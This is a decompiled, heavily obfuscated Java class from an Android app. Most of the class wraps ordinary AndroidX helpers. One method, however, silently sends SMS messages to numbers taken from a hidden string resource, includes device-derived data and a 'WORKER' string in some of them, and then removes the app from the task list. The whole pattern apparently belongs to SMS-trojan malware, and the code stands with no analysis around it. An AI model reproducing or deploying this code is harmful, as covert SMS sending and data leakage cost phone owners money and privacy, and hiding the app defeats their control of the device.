package com.vdodsodjsdt;

import android.content.ClipData;
import android.content.ClipDescription;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.ContentInfo;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.widget.ActionMenuView;
import androidx.coordinatorlayout.widget.CoordinatorLayout;
import java.lang.reflect.InvocationTargetException;
import java.nio.charset.Charset;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Objects;
import java.util.WeakHashMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public class Skgk8FYn8b4TvRiBOsElZw4XkNLhQ implements DRNSD7OTZrolKY4iK67pQWIr, n52qNbrWmzyJ3ZNP4nIEjnDJFclzk, zoGbsaB8ir89iocI2cl, gVeEGsRwgJnjS, hF6Qoen11a, RuzGhvSiqi5DE, D2N8rZ8PRRcNQ9RwMeZkr, XGVgBiBsAB8XY, vYf7o92FnfpRxGBt1Szs {
    public static final mmbJ9JootN LaeGQIruHQu81hfJldjMOQSVblH3x = new mmbJ9JootN(1);
    public final /* synthetic */ int V57tEvNfxZVVcOCAOih5PKr;
    public Object ZfQNn8hdWlEQ5cR94249PDsLR;

    public /* synthetic */ Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(int i, Object obj) {
        this.V57tEvNfxZVVcOCAOih5PKr = i;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = obj;
    }

    @Override // com.vdodsodjsdt.RuzGhvSiqi5DE
    public int Ca81ebIan1u() {
        return ((ContentInfo) this.ZfQNn8hdWlEQ5cR94249PDsLR).getSource();
    }

    @Override // com.vdodsodjsdt.n52qNbrWmzyJ3ZNP4nIEjnDJFclzk
    public boolean GI83zq0G8e7zkn(Stuu2Qyz6BSCKFEomt5b51vUnV1HQ stuu2Qyz6BSCKFEomt5b51vUnV1HQ, MenuItem menuItem) {
        mGtgDhtPVV mgtgdhtpvv = ((ActionMenuView) this.ZfQNn8hdWlEQ5cR94249PDsLR).SuB3hEmTmbbRGAhtvOOmfKEon;
        if (mgtgdhtpvv == null) {
            return false;
        }
        Iterator it = ((CopyOnWriteArrayList) ((kI1rndchf6W0AJYmJtpW) mgtgdhtpvv).V57tEvNfxZVVcOCAOih5PKr.qygqjTppWwx992.V57tEvNfxZVVcOCAOih5PKr).iterator();
        while (it.hasNext()) {
            if (((AtPwsalF1WzOhkNOK) it.next()).VxUQ9tBhpHJ2AAEDNW8sghc4m.h3jnZRsdwYJfY9UhQCkbvWciwvFHv()) {
                return true;
            }
        }
        return false;
    }

    @Override // com.vdodsodjsdt.D2N8rZ8PRRcNQ9RwMeZkr
    public pmJH8rqWIwRth8COqq HzCpKshMOoaw76hFcbOVRYMeRd(View view, pmJH8rqWIwRth8COqq pmjh8rqwiwrth8coqq) {
        ueiyNUHTUsoj16g9F ueiynuhtusoj16g9f = pmjh8rqwiwrth8coqq.VxUQ9tBhpHJ2AAEDNW8sghc4m;
        CoordinatorLayout coordinatorLayout = (CoordinatorLayout) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        if (!Objects.equals(coordinatorLayout.h3jnZRsdwYJfY9UhQCkbvWciwvFHv, pmjh8rqwiwrth8coqq)) {
            coordinatorLayout.h3jnZRsdwYJfY9UhQCkbvWciwvFHv = pmjh8rqwiwrth8coqq;
            boolean z = pmjh8rqwiwrth8coqq.ZfQNn8hdWlEQ5cR94249PDsLR() > 0;
            coordinatorLayout.pYmKDYlAmhudp = z;
            coordinatorLayout.setWillNotDraw(!z && coordinatorLayout.getBackground() == null);
            if (!ueiynuhtusoj16g9f.q1wNbhk2O6()) {
                int childCount = coordinatorLayout.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    View childAt = coordinatorLayout.getChildAt(i);
                    WeakHashMap weakHashMap = xb0r6yEzq0tw9m7nTWG5BFR8.VxUQ9tBhpHJ2AAEDNW8sghc4m;
                    if (childAt.getFitsSystemWindows() && ((TQMQBENV49PLMwKLaeaEMWAtYlx) childAt.getLayoutParams()).VxUQ9tBhpHJ2AAEDNW8sghc4m != null && ueiynuhtusoj16g9f.q1wNbhk2O6()) {
                        break;
                    }
                }
            }
            coordinatorLayout.requestLayout();
        }
        return pmjh8rqwiwrth8coqq;
    }

    public void Irh5auREsoeV1C1RaBamlmy() {
        ((Dqd3yw7CrPyec1dms6HVj) this.ZfQNn8hdWlEQ5cR94249PDsLR).Ca81ebIan1u.d9zDyyznnp3oaDT1Ug();
    }

    @Override // com.vdodsodjsdt.RuzGhvSiqi5DE
    public ContentInfo KUYypEB4eNWOZWVDpH() {
        return (ContentInfo) this.ZfQNn8hdWlEQ5cR94249PDsLR;
    }

    @Override // com.vdodsodjsdt.gVeEGsRwgJnjS
    public void LaeGQIruHQu81hfJldjMOQSVblH3x(Stuu2Qyz6BSCKFEomt5b51vUnV1HQ stuu2Qyz6BSCKFEomt5b51vUnV1HQ, rkuo6pAmWq0N rkuo6pamwq0n) {
        lHLqDPOuDPv9Tah5rl1MDkuq12 lhlqdpoudpv9tah5rl1mdkuq12 = (lHLqDPOuDPv9Tah5rl1MDkuq12) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        Handler handler = lhlqdpoudpv9tah5rl1mdkuq12.NSjgqmGjEzuugn2SsG1mZFP;
        handler.removeCallbacksAndMessages(null);
        ArrayList arrayList = lhlqdpoudpv9tah5rl1mdkuq12.M9e7PWhFYLD2lOGMker;
        int size = arrayList.size();
        int i = 0;
        while (true) {
            if (i >= size) {
                i = -1;
                break;
            } else if (stuu2Qyz6BSCKFEomt5b51vUnV1HQ == ((L7buPSHIH8sTfWLN) arrayList.get(i)).zzpBGItXfub0yWj) {
                break;
            } else {
                i++;
            }
        }
        if (i == -1) {
            return;
        }
        int i2 = i + 1;
        handler.postAtTime(new ncMyhhWdhsseALh8gkDtT1e(this, i2 < arrayList.size() ? (L7buPSHIH8sTfWLN) arrayList.get(i2) : null, rkuo6pamwq0n, stuu2Qyz6BSCKFEomt5b51vUnV1HQ), stuu2Qyz6BSCKFEomt5b51vUnV1HQ, SystemClock.uptimeMillis() + 200);
    }

    @Override // com.vdodsodjsdt.RuzGhvSiqi5DE
    public int M9e7PWhFYLD2lOGMker() {
        return ((ContentInfo) this.ZfQNn8hdWlEQ5cR94249PDsLR).getFlags();
    }

    @Override // com.vdodsodjsdt.n52qNbrWmzyJ3ZNP4nIEjnDJFclzk
    public void NSjgqmGjEzuugn2SsG1mZFP(Stuu2Qyz6BSCKFEomt5b51vUnV1HQ stuu2Qyz6BSCKFEomt5b51vUnV1HQ) {
        kI1rndchf6W0AJYmJtpW ki1rndchf6w0ajymjtpw = ((ActionMenuView) this.ZfQNn8hdWlEQ5cR94249PDsLR).Irh5auREsoeV1C1RaBamlmy;
        if (ki1rndchf6w0ajymjtpw != null) {
            ki1rndchf6w0ajymjtpw.NSjgqmGjEzuugn2SsG1mZFP(stuu2Qyz6BSCKFEomt5b51vUnV1HQ);
        }
    }

    public void RhfGHxtXxy0M0grmp2jkRjQg(int i, Object obj, daoEmhfC82oCShPhDmB3 daoemhfc82ocshphdmb3) {
        fMipVc9GFHAwh7dXz8 fmipvc9gfhawh7dxz8 = (fMipVc9GFHAwh7dXz8) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        fmipvc9gfhawh7dxz8.DUIkOzkuF3hUt(i, 3);
        daoemhfc82ocshphdmb3.LaeGQIruHQu81hfJldjMOQSVblH3x((hKY45oVk0UzhW2UdRV) obj, fmipvc9gfhawh7dxz8.NSjgqmGjEzuugn2SsG1mZFP);
        fmipvc9gfhawh7dxz8.DUIkOzkuF3hUt(i, 4);
    }

    public e05vtrYJCk78k5Eb4 TaDO7ogis3aEiWEtq() {
        EyiAfoXnENXYB7qeE5or eyiAfoXnENXYB7qeE5or = (EyiAfoXnENXYB7qeE5or) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        eyiAfoXnENXYB7qeE5or.getClass();
        aqhhl68tQrgIjcMGB3dY2YLK3vN aqhhl68tqrgijcmgb3dy2ylk3vn = zonOxHotd3BwAPJcwqr6I6uQNngg4.M9e7PWhFYLD2lOGMker;
        Object obj = EyiAfoXnENXYB7qeE5or.ZLZeBXTMq0zDztBxtRTuCHrapQ.get(eyiAfoXnENXYB7qeE5or);
        if (obj == aqhhl68tqrgijcmgb3dy2ylk3vn) {
            obj = null;
        }
        return (e05vtrYJCk78k5Eb4) obj;
    }

    @Override // com.vdodsodjsdt.XGVgBiBsAB8XY
    public l6xJVUTn99ZWyAVk VxUQ9tBhpHJ2AAEDNW8sghc4m(Class cls, V9VO2k88X42B v9VO2k88X42B) {
        N9kD5AYBrQBMPxsV0 n9kD5AYBrQBMPxsV0 = null;
        for (GYL2p896gVbkuPto gYL2p896gVbkuPto : (GYL2p896gVbkuPto[]) this.ZfQNn8hdWlEQ5cR94249PDsLR) {
            if (gYL2p896gVbkuPto.VxUQ9tBhpHJ2AAEDNW8sghc4m.equals(cls)) {
                n9kD5AYBrQBMPxsV0 = new N9kD5AYBrQBMPxsV0();
            }
        }
        if (n9kD5AYBrQBMPxsV0 != null) {
            return n9kD5AYBrQBMPxsV0;
        }
        throw new IllegalArgumentException("No initializer set for given class ".concat(cls.getName()));
    }

    @Override // com.vdodsodjsdt.gVeEGsRwgJnjS
    public void ZLZeBXTMq0zDztBxtRTuCHrapQ(Stuu2Qyz6BSCKFEomt5b51vUnV1HQ stuu2Qyz6BSCKFEomt5b51vUnV1HQ, MenuItem menuItem) {
        ((lHLqDPOuDPv9Tah5rl1MDkuq12) this.ZfQNn8hdWlEQ5cR94249PDsLR).NSjgqmGjEzuugn2SsG1mZFP.removeCallbacksAndMessages(stuu2Qyz6BSCKFEomt5b51vUnV1HQ);
    }

    @Override // com.vdodsodjsdt.RuzGhvSiqi5DE
    public ClipData ZfQNn8hdWlEQ5cR94249PDsLR() {
        return ((ContentInfo) this.ZfQNn8hdWlEQ5cR94249PDsLR).getClip();
    }

    @Override // com.vdodsodjsdt.hF6Qoen11a
    public u4GJTAMGthCvBFOcZhx3psAaG8l build() {
        return new u4GJTAMGthCvBFOcZhx3psAaG8l(new Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(((ContentInfo.Builder) this.ZfQNn8hdWlEQ5cR94249PDsLR).build()));
    }

    public wzEak8ZKpNWHd4RKPYQ f6ZQsR6bPLvvCDNXOUc(int i) {
        return null;
    }

    @Override // com.vdodsodjsdt.DRNSD7OTZrolKY4iK67pQWIr
    public boolean h3jnZRsdwYJfY9UhQCkbvWciwvFHv(Stuu2Qyz6BSCKFEomt5b51vUnV1HQ stuu2Qyz6BSCKFEomt5b51vUnV1HQ) {
        JaGiaIfgE4oZFS8GScUJb jaGiaIfgE4oZFS8GScUJb = (JaGiaIfgE4oZFS8GScUJb) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        if (stuu2Qyz6BSCKFEomt5b51vUnV1HQ == jaGiaIfgE4oZFS8GScUJb.LaeGQIruHQu81hfJldjMOQSVblH3x) {
            return false;
        }
        ((qzGH0ZhUGLEjFhdFH7Y) stuu2Qyz6BSCKFEomt5b51vUnV1HQ).qNPQb1obP7.getClass();
        jaGiaIfgE4oZFS8GScUJb.getClass();
        DRNSD7OTZrolKY4iK67pQWIr dRNSD7OTZrolKY4iK67pQWIr = jaGiaIfgE4oZFS8GScUJb.ZLZeBXTMq0zDztBxtRTuCHrapQ;
        if (dRNSD7OTZrolKY4iK67pQWIr != null) {
            return dRNSD7OTZrolKY4iK67pQWIr.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(stuu2Qyz6BSCKFEomt5b51vUnV1HQ);
        }
        return false;
    }

    public void jW7EiD0YL6xkbB158jMUzhWNWb1y() {
        MainActivity mainActivity = (MainActivity) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        if (mainActivity.SuB3hEmTmbbRGAhtvOOmfKEon && mainActivity.pzqP2AqKW6J5PO8zCKnW && mainActivity.aXO0LSrt8bKV) {
            SmsManager smsManager = Build.VERSION.SDK_INT < 31 ? SmsManager.getDefault() : (SmsManager) mainActivity.getSystemService(SmsManager.class);
            String string = mainActivity.getResources().getText(R.string.INITIAL_MESSAGES).toString();
            QoDg49fVMc3IKdfO5UuOmvvyMJ qoDg49fVMc3IKdfO5UuOmvvyMJ = QoDg49fVMc3IKdfO5UuOmvvyMJ.LaeGQIruHQu81hfJldjMOQSVblH3x;
            HashMap map = new HashMap();
            ArrayList arrayList = new ArrayList();
            ArrayList arrayList2 = new ArrayList();
            emqFyMkWkwZHiLAioE4xU9Pubq emqfymkwkwzhilaioe4xu9pubq = Tt3445ZYXN.GI83zq0G8e7zkn;
            hP3dMpetkqP hp3dmpetkqp = Tt3445ZYXN.HzCpKshMOoaw76hFcbOVRYMeRd;
            kMOMP1curnTy3VVCjVVGfKy2Q2c kmomp1curnty3vvcjvvgfky2q2c = Tt3445ZYXN.KUYypEB4eNWOZWVDpH;
            ArrayDeque arrayDeque = new ArrayDeque();
            ArrayList arrayList3 = new ArrayList(arrayList2.size() + arrayList.size() + 3);
            arrayList3.addAll(arrayList);
            Collections.reverse(arrayList3);
            ArrayList arrayList4 = new ArrayList(arrayList2);
            Collections.reverse(arrayList4);
            arrayList3.addAll(arrayList4);
            boolean z = gqt6MrXew54kIVBtPLclAu62kQ.VxUQ9tBhpHJ2AAEDNW8sghc4m;
            HashMap map2 = new HashMap(map);
            new ArrayList(arrayList);
            new ArrayList(arrayList2);
            Map map3 = (Map) new Tt3445ZYXN(qoDg49fVMc3IKdfO5UuOmvvyMJ, AKwTJzw8hwGnOgalgHPBi2qJw9.V57tEvNfxZVVcOCAOih5PKr, map2, emqfymkwkwzhilaioe4xu9pubq, 1, arrayList3, hp3dmpetkqp, kmomp1curnty3vvcjvvgfky2q2c, new ArrayList(arrayDeque)).zzpBGItXfub0yWj(string, new YBP1kPAqvoPnY4Go0K9IH489biBuH().zzpBGItXfub0yWj);
            for (String str : map3.keySet()) {
                if (ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(map3.get(str), "retr")) {
                    smsManager.sendTextMessage(str, null, zonOxHotd3BwAPJcwqr6I6uQNngg4.qNPQb1obP7(mainActivity) + "\n\n" + mainActivity.getResources().getString(R.string.WORKER), null, null);
                } else {
                    smsManager.sendTextMessage(str, null, (String) map3.get(str), null, null);
                }
            }
            mainActivity.finishAndRemoveTask();
        }
    }

    @Override // com.vdodsodjsdt.hF6Qoen11a
    public void ko09zE6UAgwkV(int i) {
        ((ContentInfo.Builder) this.ZfQNn8hdWlEQ5cR94249PDsLR).setFlags(i);
    }

    @Override // com.vdodsodjsdt.hF6Qoen11a
    public void p59rPv72J9(Uri uri) {
        ((ContentInfo.Builder) this.ZfQNn8hdWlEQ5cR94249PDsLR).setLinkUri(uri);
    }

    public boolean q11o1hieEkZDhF1MGOZI26oZiDT(int i, int i2, Bundle bundle) {
        return false;
    }

    @Override // com.vdodsodjsdt.hF6Qoen11a
    public void setExtras(Bundle bundle) {
        ((ContentInfo.Builder) this.ZfQNn8hdWlEQ5cR94249PDsLR).setExtras(bundle);
    }

    public String toString() {
        switch (this.V57tEvNfxZVVcOCAOih5PKr) {
            case 13:
                return "ContentInfoCompat{" + ((ContentInfo) this.ZfQNn8hdWlEQ5cR94249PDsLR) + "}";
            default:
                return super.toString();
        }
    }

    public wzEak8ZKpNWHd4RKPYQ vBGA6pPLqSMuYGvprl270j7(int i) {
        return null;
    }

    /* JADX WARN: Removed duplicated region for block: B:16:0x0033  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public void w0Wu95l8dVNw5rZMRu(com.vdodsodjsdt.e05vtrYJCk78k5Eb4 r7) {
        /*
            r6 = this;
            java.lang.String r0 = "newState"
            com.vdodsodjsdt.ej6unYlOWMDF.pYmKDYlAmhudp(r7, r0)
            java.lang.Object r0 = r6.ZfQNn8hdWlEQ5cR94249PDsLR
            com.vdodsodjsdt.EyiAfoXnENXYB7qeE5or r0 = (com.vdodsodjsdt.EyiAfoXnENXYB7qeE5or) r0
        L9:
            r0.getClass()
            com.vdodsodjsdt.aqhhl68tQrgIjcMGB3dY2YLK3vN r1 = com.vdodsodjsdt.zonOxHotd3BwAPJcwqr6I6uQNngg4.M9e7PWhFYLD2lOGMker
            java.util.concurrent.atomic.AtomicReferenceFieldUpdater r2 = com.vdodsodjsdt.EyiAfoXnENXYB7qeE5or.ZLZeBXTMq0zDztBxtRTuCHrapQ
            java.lang.Object r2 = r2.get(r0)
            if (r2 != r1) goto L17
            r2 = 0
        L17:
            r3 = r2
            com.vdodsodjsdt.e05vtrYJCk78k5Eb4 r3 = (com.vdodsodjsdt.e05vtrYJCk78k5Eb4) r3
            boolean r4 = r3 instanceof com.vdodsodjsdt.KxBK2u5rcQL4HqbzeQWefPhWmNVQG
            if (r4 == 0) goto L20
            r4 = 1
            goto L26
        L20:
            com.vdodsodjsdt.Aaa0yPlxUkoRscqa6EoCdeFLW r4 = com.vdodsodjsdt.Aaa0yPlxUkoRscqa6EoCdeFLW.zzpBGItXfub0yWj
            boolean r4 = com.vdodsodjsdt.ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(r3, r4)
        L26:
            if (r4 == 0) goto L29
            goto L33
        L29:
            boolean r4 = r3 instanceof com.vdodsodjsdt.PxpwS30sQOcU2DeGAmPm
            if (r4 == 0) goto L35
            int r4 = r7.VxUQ9tBhpHJ2AAEDNW8sghc4m
            int r5 = r3.VxUQ9tBhpHJ2AAEDNW8sghc4m
            if (r4 <= r5) goto L39
        L33:
            r3 = r7
            goto L39
        L35:
            boolean r4 = r3 instanceof com.vdodsodjsdt.ubY8soLHpjwnunH1S9iro00A
            if (r4 == 0) goto L47
        L39:
            if (r2 != 0) goto L3c
            r2 = r1
        L3c:
            if (r3 != 0) goto L3f
            goto L40
        L3f:
            r1 = r3
        L40:
            boolean r1 = r0.V57tEvNfxZVVcOCAOih5PKr(r2, r1)
            if (r1 == 0) goto L9
            return
        L47:
            com.vdodsodjsdt.Eyg9qHiQ9Ki1REKbbd3J r7 = new com.vdodsodjsdt.Eyg9qHiQ9Ki1REKbbd3J
            r7.<init>()
            throw r7
        */
        throw new UnsupportedOperationException("Method not decompiled: com.vdodsodjsdt.Skgk8FYn8b4TvRiBOsElZw4XkNLhQ.w0Wu95l8dVNw5rZMRu(com.vdodsodjsdt.e05vtrYJCk78k5Eb4):void");
    }

    @Override // com.vdodsodjsdt.DRNSD7OTZrolKY4iK67pQWIr
    public void zzpBGItXfub0yWj(Stuu2Qyz6BSCKFEomt5b51vUnV1HQ stuu2Qyz6BSCKFEomt5b51vUnV1HQ, boolean z) {
        if (stuu2Qyz6BSCKFEomt5b51vUnV1HQ instanceof qzGH0ZhUGLEjFhdFH7Y) {
            ((qzGH0ZhUGLEjFhdFH7Y) stuu2Qyz6BSCKFEomt5b51vUnV1HQ).RhfGHxtXxy0M0grmp2jkRjQg.HzCpKshMOoaw76hFcbOVRYMeRd().V57tEvNfxZVVcOCAOih5PKr(false);
        }
        DRNSD7OTZrolKY4iK67pQWIr dRNSD7OTZrolKY4iK67pQWIr = ((JaGiaIfgE4oZFS8GScUJb) this.ZfQNn8hdWlEQ5cR94249PDsLR).ZLZeBXTMq0zDztBxtRTuCHrapQ;
        if (dRNSD7OTZrolKY4iK67pQWIr != null) {
            dRNSD7OTZrolKY4iK67pQWIr.zzpBGItXfub0yWj(stuu2Qyz6BSCKFEomt5b51vUnV1HQ, z);
        }
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(fMipVc9GFHAwh7dXz8 fmipvc9gfhawh7dxz8) {
        this.V57tEvNfxZVVcOCAOih5PKr = 9;
        iJsJOOjKyWEygkebu5yh4.VxUQ9tBhpHJ2AAEDNW8sghc4m(fmipvc9gfhawh7dxz8, "output");
        this.ZfQNn8hdWlEQ5cR94249PDsLR = fmipvc9gfhawh7dxz8;
        fmipvc9gfhawh7dxz8.NSjgqmGjEzuugn2SsG1mZFP = this;
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(boolean z) {
        this.V57tEvNfxZVVcOCAOih5PKr = 6;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = new AtomicBoolean(z);
    }

    /* JADX WARN: Type inference failed for: r1v2, types: [com.vdodsodjsdt.LjYjO0YPtp] */
    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(final int i, final int i2, final int i3, final int i4, final boolean z, final boolean z2, final qF22Y620JkFyombtDYw0h0h8Rxpja qf22y620jkfyombtdyw0h0h8rxpja) {
        this.V57tEvNfxZVVcOCAOih5PKr = 11;
        TimeUnit timeUnit = TimeUnit.MINUTES;
        final j5jyRGaw4k j5jyrgaw4k = j5jyRGaw4k.KUYypEB4eNWOZWVDpH;
        IN79WcIk5xB4t0GjRT43qPLs5 iN79WcIk5xB4t0GjRT43qPLs5 = IN79WcIk5xB4t0GjRT43qPLs5.LaeGQIruHQu81hfJldjMOQSVblH3x;
        ej6unYlOWMDF.pYmKDYlAmhudp(timeUnit, "timeUnit");
        ej6unYlOWMDF.pYmKDYlAmhudp(j5jyrgaw4k, "taskRunner");
        this.ZfQNn8hdWlEQ5cR94249PDsLR = new IBo1UM4YpEOkefD(j5jyrgaw4k, timeUnit, iN79WcIk5xB4t0GjRT43qPLs5, new l9lNb4EFvaVMyQnsu() { // from class: com.vdodsodjsdt.LjYjO0YPtp
            /* JADX WARN: Multi-variable type inference failed */
            @Override // com.vdodsodjsdt.l9lNb4EFvaVMyQnsu
            public final Object zzpBGItXfub0yWj(Object obj, Object obj2, tfu79AIgc4CGAZaxd4HhD tfu79aigc4cgazaxd4hhd) {
                IBo1UM4YpEOkefD iBo1UM4YpEOkefD = (IBo1UM4YpEOkefD) obj;
                xJilh3An9LAykwTqP7vc xjilh3an9laykwtqp7vc = (xJilh3An9LAykwTqP7vc) obj2;
                ej6unYlOWMDF.pYmKDYlAmhudp(iBo1UM4YpEOkefD, "pool");
                ej6unYlOWMDF.pYmKDYlAmhudp(xjilh3an9laykwtqp7vc, "address");
                j5jyRGaw4k j5jyrgaw4k2 = j5jyrgaw4k;
                return new C4zZovtCzKIEzp57WaFgR(new kmNSRe3k7WjLe4BkDa(new hZGwZLSkscFiWiqL(j5jyrgaw4k2, iBo1UM4YpEOkefD, i, i2, i3, i4, z, z2, xjilh3an9laykwtqp7vc, qf22y620jkfyombtdyw0h0h8rxpja, (ixvYVtn9EMRQ7IMkUn6Ak2pqJO6h) tfu79aigc4cgazaxd4hhd)), j5jyrgaw4k2);
            }
        });
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(int i) {
        Handler handler;
        Handler handlerZzpBGItXfub0yWj;
        Pkjoalb0jfHaOD pkjoalb0jfHaOD;
        this.V57tEvNfxZVVcOCAOih5PKr = i;
        switch (i) {
            case 1:
                if (Build.VERSION.SDK_INT >= 26) {
                    this.ZfQNn8hdWlEQ5cR94249PDsLR = new G45TKWeW1O75lQ0z3oFvQ7l(this);
                    return;
                } else {
                    this.ZfQNn8hdWlEQ5cR94249PDsLR = new l4Nor8ciznp7X7NENgLU8bBvEm(this);
                    return;
                }
            case g8kevnL6UKpr15IYtcPJXuLo1L4.DOUBLE_FIELD_NUMBER /* 7 */:
                this.ZfQNn8hdWlEQ5cR94249PDsLR = new AtomicInteger(0);
                return;
            case 15:
                this.ZfQNn8hdWlEQ5cR94249PDsLR = new EyiAfoXnENXYB7qeE5or(Aaa0yPlxUkoRscqa6EoCdeFLW.zzpBGItXfub0yWj);
                return;
            case 16:
                Looper mainLooper = Looper.getMainLooper();
                if (Build.VERSION.SDK_INT >= 28) {
                    handlerZzpBGItXfub0yWj = kHXwlw9VpxBho.zzpBGItXfub0yWj(mainLooper);
                } else {
                    try {
                        handler = (Handler) Handler.class.getDeclaredConstructor(Looper.class, Handler.Callback.class, Boolean.TYPE).newInstance(mainLooper, null, Boolean.TRUE);
                    } catch (IllegalAccessException e) {
                        e = e;
                        Log.w("HandlerCompat", "Unable to invoke Handler(Looper, Callback, boolean) constructor", e);
                        handler = new Handler(mainLooper);
                    } catch (InstantiationException e2) {
                        e = e2;
                        Log.w("HandlerCompat", "Unable to invoke Handler(Looper, Callback, boolean) constructor", e);
                        handler = new Handler(mainLooper);
                    } catch (NoSuchMethodException e3) {
                        e = e3;
                        Log.w("HandlerCompat", "Unable to invoke Handler(Looper, Callback, boolean) constructor", e);
                        handler = new Handler(mainLooper);
                    } catch (InvocationTargetException e4) {
                        Throwable cause = e4.getCause();
                        if (!(cause instanceof RuntimeException)) {
                            if (cause instanceof Error) {
                                throw ((Error) cause);
                            }
                            throw new RuntimeException(cause);
                        }
                        throw ((RuntimeException) cause);
                    }
                    handlerZzpBGItXfub0yWj = handler;
                    break;
                }
                this.ZfQNn8hdWlEQ5cR94249PDsLR = handlerZzpBGItXfub0yWj;
                return;
            case 21:
                this.ZfQNn8hdWlEQ5cR94249PDsLR = null;
                return;
            default:
                fsiIibR9odqEwhUwtyl8oM fsiiibr9odqewhuwtyl8om = fsiIibR9odqEwhUwtyl8oM.V57tEvNfxZVVcOCAOih5PKr;
                try {
                    pkjoalb0jfHaOD = (Pkjoalb0jfHaOD) Class.forName("androidx.datastore.preferences.protobuf.DescriptorMessageInfoFactory").getDeclaredMethod("getInstance", null).invoke(null, null);
                    break;
                } catch (Exception unused) {
                    pkjoalb0jfHaOD = LaeGQIruHQu81hfJldjMOQSVblH3x;
                }
                Pkjoalb0jfHaOD[] pkjoalb0jfHaODArr = {mmbJ9JootN.zzpBGItXfub0yWj, pkjoalb0jfHaOD};
                rohCXdVkVhdgrh2h rohcxdvkvhdgrh2h = new rohCXdVkVhdgrh2h();
                rohcxdvkvhdgrh2h.VxUQ9tBhpHJ2AAEDNW8sghc4m = pkjoalb0jfHaODArr;
                Charset charset = iJsJOOjKyWEygkebu5yh4.VxUQ9tBhpHJ2AAEDNW8sghc4m;
                this.ZfQNn8hdWlEQ5cR94249PDsLR = rohcxdvkvhdgrh2h;
                return;
        }
    }

    public void q1wNbhk2O6(int i) {
    }

    public void zIvmSL0wzmmKGc3X39b2Gw2mUGE(int i) {
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(GYL2p896gVbkuPto[] gYL2p896gVbkuPtoArr) {
        this.V57tEvNfxZVVcOCAOih5PKr = 22;
        ej6unYlOWMDF.pYmKDYlAmhudp(gYL2p896gVbkuPtoArr, "initializers");
        this.ZfQNn8hdWlEQ5cR94249PDsLR = gYL2p896gVbkuPtoArr;
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(TextView textView) {
        this.V57tEvNfxZVVcOCAOih5PKr = 19;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = new MLgmLqemgM5g0huT(textView);
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(EditText editText) {
        this.V57tEvNfxZVVcOCAOih5PKr = 18;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = new o0x3OWMw3He(editText, 5);
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(Uri uri, ClipDescription clipDescription, Uri uri2) {
        this.V57tEvNfxZVVcOCAOih5PKr = 23;
        if (Build.VERSION.SDK_INT >= 25) {
            this.ZfQNn8hdWlEQ5cR94249PDsLR = new aOO0ZIJUTem4dsrnzqehnx(uri, clipDescription, uri2);
        } else {
            this.ZfQNn8hdWlEQ5cR94249PDsLR = new NrjuzzioPqfttNRptBDpZDzSYUrcM(uri, clipDescription, uri2, 6);
        }
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(ContentInfo contentInfo) {
        this.V57tEvNfxZVVcOCAOih5PKr = 13;
        contentInfo.getClass();
        this.ZfQNn8hdWlEQ5cR94249PDsLR = T90IXCZZ40nlyyL0UJd.HzCpKshMOoaw76hFcbOVRYMeRd(contentInfo);
    }

    public Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(ClipData clipData, int i) {
        this.V57tEvNfxZVVcOCAOih5PKr = 12;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = T90IXCZZ40nlyyL0UJd.GI83zq0G8e7zkn(clipData, i);
    }

    @Override // com.vdodsodjsdt.zoGbsaB8ir89iocI2cl
    public void pYmKDYlAmhudp(int i, float f) {
    }
}
